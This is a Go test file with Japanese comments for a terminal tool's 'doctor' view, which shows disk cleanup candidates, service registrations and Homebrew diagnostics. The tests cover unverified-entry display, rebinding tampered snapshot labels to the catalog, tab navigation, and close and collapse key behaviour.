func doctorRiskMarkText(r disk.Result) string { m, _ := doctorview.DoctorRiskMark(r); return m }

// 検出条件そのものが未実測のエントリ (disk.Entry.Unverified) を、候補 0 件でも UI が畳まないこと。
// 畳むと「名前が違って 1 件も当たらなかった」が「候補なし = きれい」と**同じ見え方**になる
// (issue 169 / 207)。
//
// 🚨 **CLI (disk.Format) と UI (diskSection) で突き合わせる**。同じデータから同じ結論を描く形は、
// 片方のテストがもう片方を 1 mm も守らない (規範: mutation-verify-new-tests.md
// 「同じ判定・同じ結論を 2 箇所で別実装していないか」)。片側の分岐だけ消す変異が
// red になるよう、両方の出力を同じ fixture から見る。
func TestDoctorUnverifiedEntryMatchesCLI(t *testing.T) {
	unver := disk.Result{
		Entry: disk.Entry{ID: "u", Label: "未実測の項目", Risk: disk.RiskSafe, DeleteVia: "rm",
			Recover: "再生成されません", Unverified: "ファイル名が未実測"},
		Status: disk.StatusOK, Items: []disk.Item{},
	}
	// 対照: 同じ 0 件でも Unverified が無ければ両方で畳まれる
	verified := disk.Result{
		Entry: disk.Entry{ID: "v", Label: "実測済みの項目", Risk: disk.RiskSafe, DeleteVia: "rm",
			Recover: "再生成されません"},
		Status: disk.StatusOK, Items: []disk.Item{},
	}
	rep := disk.Report{Results: []disk.Result{unver, verified}}

	cli := disk.Format(rep, disk.Env{}, time.Date(2026, 9, 3, 12, 0, 0, 0, time.Local))
	v := &doctorview.DoctorView{Shown: true, Expanded: map[doctorview.RowKey]bool{}, DiskRep: &rep, DiskResults: rep.Results}
	wide := doctortest.DoctorTestOpts(60)
	wide.Width = 240
	ui := strings.Join(v.Lines(wide), "\n")

	// 両方に出る / 両方から消える、を 1 つずつ確かめる (片側だけ見ると分岐の欠落を見逃す)
	for _, c := range []struct {
		name string
		out  string
	}{{"CLI", cli}, {"UI", ui}} {
		if !strings.Contains(c.out, "未実測の項目") {
			t.Errorf("%s: 未実測のエントリが 0 件で畳まれている (探せていないことが画面から消える):\n%s", c.name, c.out)
		}
		if !strings.Contains(c.out, "🔎 未検証") {
			t.Errorf("%s: 未実測のエントリに専用のマークが無い (✅ 安全 だと『調べたうえで安全』と読める):\n%s", c.name, c.out)
		}
		if strings.Contains(c.out, "✅ 安全") {
			t.Errorf("%s: 未実測のエントリに『✅ 安全』が出ている (調べられていないので嘘になる):\n%s", c.name, c.out)
		}
		if !strings.Contains(c.out, `0 件ですが「候補なし」ではありません`) {
			t.Errorf("%s: 0 件の意味を説明する行が無い:\n%s", c.name, c.out)
		}
		if strings.Contains(c.out, "再生成されません") {
			t.Errorf("%s: 0 件の未実測エントリに復元方法が出ている (検出できているように読める):\n%s", c.name, c.out)
		}
		if strings.Contains(c.out, "実測済みの項目") {
			t.Errorf("%s: Unverified の無い 0 件エントリまで表示されている (畳む側の規律が壊れている):\n%s", c.name, c.out)
		}
	}
}

// snapshot から復元した行は、**表示文言をカタログの今の定義へ束ね直す** (issue 229)。
// snapshot には Entry が丸ごと保存されるので、そのまま使うと (a) カタログを直しても古い文言が
// 出続け (b) 一般ユーザー権限で書き換えた Label / Detail がそのまま行と y のコピーへ載る。
func TestDoctorSnapshotRebindsEntryToCatalog(t *testing.T) {
	v := doctortest.DoctorTestView(t) // カタログは 1 件 (ID=thing / Label="Thing キャッシュ")
	forged := disk.Entry{
		ID: "thing", Label: "偽ラベル (snapshot で書き換えた)", Risk: disk.RiskSafe,
		Recover: "偽の復元方法", DeleteVia: "rm", Detail: "偽の解説",
	}
	doctortest.WriteDoctorSnapshot(t, doctorview.DoctorSnapshot{ScannedAt: time.Now(), Disk: disk.Report{
		Results: []disk.Result{{Entry: forged, Status: disk.StatusOK, Size: 4096,
			Items: []disk.Item{{Path: "/tmp/x", Size: 4096}}}},
	}})
	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていない)。
	// 主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
	doctortest.RunDoctorCmds(t, v, v.Open())
	if v.SnapshotAt.IsZero() {
		t.Fatal("TTL 内の snapshot を使わずに走査した (前提が違う)")
	}
	out := strings.Join(v.Lines(doctortest.DoctorTestOpts(30)), "\n")
	if !strings.Contains(out, "Thing キャッシュ") {
		t.Errorf("カタログの Label が出ていない:\n%s", out)
	}
	if strings.Contains(out, "偽ラベル") {
		t.Errorf("snapshot に書かれた Label がそのまま出ている (再束縛していない):\n%s", out)
	}
	// y のコピーにも載らないこと (行の copyText はカタログ由来の文言で組む)
	for _, r := range v.Rows {
		if strings.Contains(r.CopyText, "偽") || strings.Contains(r.Text, "偽") {
			t.Errorf("細工した文言がコピー/表示に載っている: text=%q copyText=%q", r.Text, r.CopyText)
		}
	}
}

// h / l はタブ移動 (issues viewer と同じ語彙: tab/l/right = 次、shift+tab/h/left = 前)。
// 木の開閉は Enter に一本化してある。
func TestDoctorHLMovesTabs(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	doctortest.RunDoctorCmds(t, v, v.Open())
	_ = v.Lines(doctortest.DoctorTestOpts(20))

	for _, want := range []doctorview.DoctorTab{doctorview.TabSvc, doctorview.TabBrew, doctorview.TabDocker, doctorview.TabSSD, doctorview.TabDisk} {
		v.HandleKey("l", 20)
		if v.Tab != want {
			t.Fatalf("l で %v へ行かない: %v", want, v.Tab)
		}
	}
	for _, want := range []doctorview.DoctorTab{doctorview.TabSSD, doctorview.TabDocker, doctorview.TabBrew, doctorview.TabSvc, doctorview.TabDisk} {
		v.HandleKey("h", 20)
		if v.Tab != want {
			t.Fatalf("h で %v へ戻らない: %v", want, v.Tab)
		}
	}
	// 矢印も同じ
	v.HandleKey("right", 20)
	if v.Tab != doctorview.TabSvc {
		t.Errorf("right でタブが動かない: %v", v.Tab)
	}
	v.HandleKey("left", 20)
	if v.Tab != doctorview.TabDisk {
		t.Errorf("left でタブが戻らない: %v", v.Tab)
	}

	// 🚨 h/l を移動へ渡したので、**開閉は Enter だけ**が持つ。
	// 開いている行で h を押しても畳まれない (タブが動くだけ) ことまで固定する
	v.Tab = doctorview.TabDisk
	_ = v.Lines(doctortest.DoctorTestOpts(20))
	parent := v.Rows[v.Cur.Index].Key
	v.HandleKey("enter", 20)
	if !v.Expanded[parent] {
		t.Fatal("Enter で開かない")
	}
	v.HandleKey("h", 20) // タブが動くだけ
	if !v.Expanded[parent] {
		t.Error("h で畳まれた (h はタブ移動のはず)")
	}
	v.HandleKey("l", 20) // 戻る
	if v.Tab != doctorview.TabDisk {
		t.Fatalf("タブが戻らない: %v", v.Tab)
	}
	v.Cur.JumpTo(v.Rows, parent)
	v.HandleKey("enter", 20)
	if v.Expanded[parent] {
		t.Error("もう一度 Enter で畳まれない")
	}

	if h := v.Hint(120); strings.Contains(h, "h/l") {
		t.Errorf("hint がまだ h/l を開閉として案内している: %q", h)
	}
}

// 指摘が 1 件も無いときだけ祝う (ユーザー要望 2026-09-04)。
//
// 🚨 「診断できず」がある状態で祝わない。0 件と「測れなかった」を同じ顔で出すと、
// 見えていない問題を「無い」と読ませることになる (この repo が繰り返し塞いできた形)。
func TestDoctorCelebratesOnlyWhenTrulyClean(t *testing.T) {
	o := doctorview.DoctorRenderOpts{Width: 96, Page: 30, Colored: false, Spinner: "⠋", Now: time.Now()}
	render := func(v *doctorview.DoctorView) string {
		var b strings.Builder
		for t := doctorview.DoctorTab(0); t < doctorview.NumDoctorTabs; t++ {
			v.Tab = t
			b.WriteString(strings.Join(v.Lines(o), "\n") + "\n")
		}
		return b.String()
	}

	t.Run("両方きれいなら祝う", func(t *testing.T) {
		v := &doctorview.DoctorView{Shown: true, Expanded: map[doctorview.RowKey]bool{}}
		v.SvcRep, v.Brew = &svc.Report{}, &doctorview.BrewDoctorResult{Clean: true}
		out := render(v)
		if strings.Count(out, "🎉") != 2 {
			t.Errorf("サービスと Homebrew の両方で祝っていない:\n%s", out)
		}
	})
	t.Run("壊れた登録があれば祝わない", func(t *testing.T) {
		v := &doctorview.DoctorView{Shown: true, Expanded: map[doctorview.RowKey]bool{}}
		v.SvcRep = &svc.Report{Findings: []svc.Finding{{Label: "com.x.y", PlistPath: "/L/com.x.y.plist", Domain: "gui/501"}}}
		v.Brew = &doctorview.BrewDoctorResult{Clean: true}
		out := render(v)
		if strings.Count(out, "🎉") != 1 {
			t.Errorf("壊れた登録があるのにサービス側で祝った:\n%s", out)
		}
	})
	// 🚨 この 2 つは **doctorview.ParseBrewDoctor を通して**状態を作る。リテラルで
	// doctorview.BrewDoctorResult{Unavailable: ...} を組むと、描画側の case の順序だけを見ることになり
	// 「そもそもその状態を作れるか」を検査しない = 局所の変異では壊せないテストになる
	// (変異検証で実際に素通りした)
	t.Run("診断できずなら祝わない", func(t *testing.T) {
		v := &doctorview.DoctorView{Shown: true, Expanded: map[doctorview.RowKey]bool{}}
		v.SvcRep = &svc.Report{}
		b := doctorview.ParseBrewDoctor("", "Error: brew is broken\n", 1) // 非 0 なのに警告なし = 診断できず
		if b.Unavailable == "" {
			t.Fatalf("前提が崩れている: 診断できずになっていない: %+v", b)
		}
		v.Brew = &b
		// 🚨 Homebrew の行に限って見る。全体を見るとサービス側の 🎉 を拾う
		if out := render(v); strings.Contains(out, "🎉 Your system is ready") {
			t.Errorf("診断できていないのに Homebrew で祝った:\n%s", out)
		}
	})
	t.Run("警告があれば祝わない", func(t *testing.T) {
		v := &doctorview.DoctorView{Shown: true, Expanded: map[doctorview.RowKey]bool{}}
		v.SvcRep = &svc.Report{}
		b := doctorview.ParseBrewDoctor("", brewWarnDeprecated+"\n", 1)
		if len(b.Warnings) == 0 {
			t.Fatalf("前提が崩れている: 警告が解析できていない: %+v", b)
		}
		v.Brew = &b
		if out := render(v); strings.Contains(out, "🎉 Your system is ready") {
			t.Errorf("警告があるのに Homebrew で祝った:\n%s", out)
		}
	})
}

// タブ: 送る / 戻る / 一望性 / カーソルを覚える。
//
// 🚨 タブ分割の目的は「印を付けた後にやることをタブごとに 1 つにする」ことだが、
// **一望性を失わないこと**が条件。タブ行に 3 つとも件数が出ていれば、切り替えなくても
// どこに何件あるかが分かる (出ないと異常の有無を知るために全タブを回ることになる)。
func TestDoctorTabs(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	doctortest.RunDoctorCmds(t, v, v.Open())
	o := doctortest.DoctorTestOpts(20)

	t.Run("一望性: どのタブでも 3 つとも件数が出る", func(t *testing.T) {
		for _, tb := range []doctorview.DoctorTab{doctorview.TabDisk, doctorview.TabSvc, doctorview.TabBrew} {
			v.Tab = tb
			bar := v.TabBarLine(o)
			for _, want := range []string{"ディスク", "サービス", "Homebrew"} {
				if !strings.Contains(bar, want) {
					t.Errorf("tab=%d のタブ行に %q が無い: %q", tb, want, bar)
				}
			}
			if !strings.Contains(bar, "1") { // Homebrew の警告 1 件
				t.Errorf("tab=%d のタブ行に件数が出ていない: %q", tb, bar)
			}
		}
	})

	t.Run("表示中のタブの節だけ描く", func(t *testing.T) {
		v.Tab = doctorview.TabDisk
		out := doctortest.DoctorText(v, 20)
		if !strings.Contains(out, "▌ディスク占有") || strings.Contains(out, "▌Homebrew") {
			t.Errorf("ディスクのタブに他の節が出ている:\n%s", out)
		}
		v.Tab = doctorview.TabBrew
		out = doctortest.DoctorText(v, 20)
		if !strings.Contains(out, "▌Homebrew") || strings.Contains(out, "▌ディスク占有") {
			t.Errorf("Homebrew のタブに他の節が出ている:\n%s", out)
		}
	})

	t.Run("tab で送り shift+tab で戻る (端で回る)", func(t *testing.T) {
		v.Tab = doctorview.TabDisk
		for _, want := range []doctorview.DoctorTab{doctorview.TabSvc, doctorview.TabBrew, doctorview.TabDocker, doctorview.TabSSD, doctorview.TabDisk} {
			v.HandleKey("tab", 20)
			if v.Tab != want {
				t.Fatalf("tab で %v へ行かない: %v", want, v.Tab)
			}
		}
		for _, want := range []doctorview.DoctorTab{doctorview.TabSSD, doctorview.TabDocker, doctorview.TabBrew, doctorview.TabSvc, doctorview.TabDisk} {
			v.HandleKey("shift+tab", 20)
			if v.Tab != want {
				t.Fatalf("shift+tab で %v へ戻らない: %v", want, v.Tab)
			}
		}
	})

	// 🚨 **別のタブでカーソルを動かしてから戻る**ことで検査する。往復するだけだと、
	// タブごとに覚えていなくても cur がそのまま残って restore が同じ行を引き当てるので、
	// 「覚えている」と「持ち越しているだけ」を区別できない (変異で実際に素通りした)
	t.Run("カーソルはタブごとに覚える", func(t *testing.T) {
		// 🚨 **別のタブでカーソルを動かしてから戻る**ことで検査する。往復するだけだと、
		// タブごとに覚えていなくても cur がそのまま残って restore が同じ行を引き当てるので、
		// 「覚えている」と「持ち越しているだけ」を区別できない (変異で実際に素通りした)。
		// 切り替えは handleKey だけで行う (v.tab を直接触ると moveTab の保存を飛ばす)
		v.Tab = doctorview.TabDisk
		_ = v.Lines(o)
		v.HandleKey("enter", 20) // ディスクの行を開いて中の対象パスへ移る
		_ = v.Lines(o)
		diskKey := v.Cur.Key
		if !strings.HasPrefix(string(diskKey), "diskitem:") {
			t.Fatalf("前提が崩れている: ディスクのカーソルが対象パスに無い: %q", diskKey)
		}
		v.HandleKey("tab", 20) // → サービス
		v.HandleKey("tab", 20) // → Homebrew
		v.HandleKey("tab", 20) // → Docker
		v.HandleKey("tab", 20) // → SSD
		_ = v.Lines(o)
		if v.Cur.Key == diskKey {
			t.Fatalf("前提が崩れている: SSD でディスクの行を指している: %q", diskKey)
		}
		v.HandleKey("tab", 20) // → ディスクへ一周
		_ = v.Lines(o)
		if v.Cur.Key != diskKey {
			t.Errorf("ディスクのカーソルが戻らない: %q (期待 %q)", v.Cur.Key, diskKey)
		}
	})
}

// q は「Enter で開いたものを 1 段閉じる」を先に持つ。開いた先で q を押して画面ごと消えるのは、
// 開いた操作の取り消しとして重すぎる (ユーザー要望 2026-09-04)。
// 畳むものが無いときだけ doctor を閉じ、D / esc は無条件に閉じる。
func TestDoctorQCollapsesBeforeClosing(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	doctortest.RunDoctorCmds(t, v, v.Open())
	v.Tab = doctorview.TabDisk
	_ = v.Lines(doctortest.DoctorTestOpts(20))

	parent := v.Rows[v.Cur.Index].Key
	v.HandleKey("enter", 20)
	if !v.Expanded[parent] {
		t.Fatal("Enter で開かない")
	}

	// (1) 開いたエントリの行で q → 畳むだけ。画面は閉じない
	if act := v.HandleKey("q", 20); act == doctorview.DoctorClosed {
		t.Error("開いている行の q で doctor ごと閉じた")
	}
	if v.Expanded[parent] {
		t.Error("q で畳まれない")
	}
	if !v.Shown {
		t.Error("q で画面が閉じた (畳むだけのはず)")
	}

	// (2) 中の対象パスの行に居るときの q → 親を畳んでカーソルを親へ戻す
	v.HandleKey("enter", 20)
	_ = v.Lines(doctortest.DoctorTestOpts(20))
	v.JumpIntoDetail()
	_ = v.Lines(doctortest.DoctorTestOpts(20))
	if got := v.Rows[v.Cur.Index].Key; !strings.HasPrefix(string(got), "diskitem:") {
		t.Fatalf("対象パスの行へ入れていない: %q", got)
	}
	if act := v.HandleKey("q", 20); act == doctorview.DoctorClosed {
		t.Error("対象パスの行の q で doctor ごと閉じた")
	}
	if v.Expanded[parent] {
		t.Error("対象パスの行の q で親が畳まれない")
	}
	if v.Cur.Key != parent {
		t.Errorf("カーソルが親へ戻らない: %q; want %q", v.Cur.Key, parent)
	}

	// (3) 畳むものが無ければ q は閉じる (抜ける手段が消えていないこと)
	_ = v.Lines(doctortest.DoctorTestOpts(20))
	if act := v.HandleKey("q", 20); act != doctorview.DoctorClosed {
		t.Errorf("何も開いていないときの q が閉じない: %v", act)
	}
	if v.Shown {
		t.Error("q で閉じていない")
	}
}

// hint の閉じる案内は畳める状態かどうかで切り替わる (q が閉じない間は q を載せない)。
// D / esc はどちらの状態でも案内に残る = 一発で抜ける手段が消えない。
func TestDoctorCloseHintDropsQWhileCollapsible(t *testing.T) {
	v := doctortest.DoctorTestView(t)
	doctortest.RunDoctorCmds(t, v, v.Open())
	v.Tab = doctorview.TabDisk
	_ = v.Lines(doctortest.DoctorTestOpts(20))

	if h := v.Hint(200); !strings.Contains(h, "D/q/esc: 閉じる") {
		t.Errorf("閉じているときの hint に q が無い: %q", h)
	}
	v.HandleKey("enter", 20)
	_ = v.Lines(doctortest.DoctorTestOpts(20))
	h := v.Hint(200)
	if strings.Contains(h, "D/q/esc") {
		t.Errorf("畳める状態なのに hint が q を閉じるキーとして案内している: %q", h)
	}
	if !strings.Contains(h, "D/esc: 閉じる") {
		t.Errorf("抜ける手段の案内が消えた: %q", h)
	}
}

// D / esc は開いていても無条件に閉じる (q だけが「1 段畳む」を持つ)。
func TestDoctorEscClosesEvenWhenExpanded(t *testing.T) {
	for _, key := range []string{"D", "esc"} {
		v := doctortest.DoctorTestView(t)
		doctortest.RunDoctorCmds(t, v, v.Open())
		v.Tab = doctorview.TabDisk
		_ = v.Lines(doctortest.DoctorTestOpts(20))
		v.HandleKey("enter", 20)
		_ = v.Lines(doctortest.DoctorTestOpts(20))
		if act := v.HandleKey(key, 20); act != doctorview.DoctorClosed {
			t.Errorf("%s が開いている状態で閉じない: %v", key, act)
		}
		if v.Shown {
			t.Errorf("%s で閉じていない", key)
		}
	}
}

// 畳まれている行の detail は組まない (issue 270)。
//
// buildRows の add() が detail を並べるのは v.expanded[r.key] のときだけなので、
// 畳まれている行のぶんは**作って捨てていた**。diskDetail は Contents / Items を全件走査するので、
// 1 フレームのコストがカタログ全エントリの Items / Contents の総数に比例していた。
//
// 🚨 判定は「展開できるか (hasDetail)」と「detail が実際に組まれているか」を**別々に**見る。
// len(detail) だけで展開可否を決める形へ戻すと、畳まれた行が展開できなくなる。
func TestDoctorCollapsedRowsDoNotBuildDetail(t *testing.T) {
	v := &doctorview.DoctorView{Shown: true, Expanded: map[doctorview.RowKey]bool{}}
	v.DiskRep = &disk.Report{Results: []disk.Result{{
		Entry:  disk.Entry{ID: "e0", Label: "E0", Risk: disk.RiskSafe, Recover: "r", DeleteVia: "rm"},
		Status: disk.StatusOK, Size: 3,
		Items: []disk.Item{{Path: "/p/a", Size: 1}, {Path: "/p/b", Size: 1}, {Path: "/p/c", Size: 1}},
	}}}
	v.SvcRep = &svc.Report{}
	v.Brew = &doctorview.BrewDoctorResult{Clean: true}
	o := doctortest.DoctorTestOpts(40)

	rows := v.BuildRows(o)
	var target *doctorview.DoctorRow
	for i := range rows {
		if rows[i].Key == "disk:e0" {
			target = &rows[i]
		}
	}
	if target == nil {
		t.Fatal("対象の行が見つからない (fixture が届いていない)")
	}
	if !target.HasDetail {
		t.Error("畳まれていても「展開できる」は真であるべき (hasDetail)")
	}
	if len(target.Detail) != 0 {
		t.Errorf("畳まれているのに detail を %d 行組んでいる (作って捨てている)", len(target.Detail))
	}

	// 陽性対照: 展開したら組む (上の assert が「常に空」ではないことの担保)
	v.Expanded["disk:e0"] = true
	rows = v.BuildRows(o)
	for i := range rows {
		if rows[i].Key == "disk:e0" {
			target = &rows[i]
		}
	}
	if len(target.Detail) == 0 {
		t.Error("展開しているのに detail が空 (遅延が効きすぎている)")
	}
}
